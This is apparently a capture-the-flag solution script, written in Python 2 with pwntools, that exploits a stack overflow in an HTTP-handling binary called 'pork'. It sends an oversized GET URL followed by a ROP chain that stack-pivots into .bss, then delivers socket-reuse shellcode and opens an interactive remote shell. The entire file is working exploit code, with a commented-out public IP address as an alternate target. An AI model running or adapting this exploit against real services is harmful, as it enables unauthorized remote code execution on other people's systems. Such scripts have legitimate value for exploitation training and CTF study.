#!/usr/bin/env python2

from pwn import *

context(arch = 'i386', os = 'linux')

HOST = '127.0.0.1'
#HOST = '184.72.73.160'
PORT = 33227

r = remote(HOST, PORT)
elf = ELF('./pork-8c2fdf93e211c7358e0192a24bc951843da672b1')
rop1 = ROP(elf)
rop2 = ROP(elf)

buf = elf.bss(0x80)
shellcode = asm(shellcraft.findpeersh())

rop1.read(4, buf+5*4, len(shellcode))
rop1.call(buf+5*4)

for n,c in enumerate(rop1.chain()):
    rop2.sprintf(buf+n, elf.search(c).next())

rop2.migrate(buf)

r.send('GET http://' + 'A'.ljust(1024, 'A') + rop2.chain() + ' HTTP/1.1\r\n')
sleep(0.1)
r.send('\r\n' + shellcode)
r.interactive()
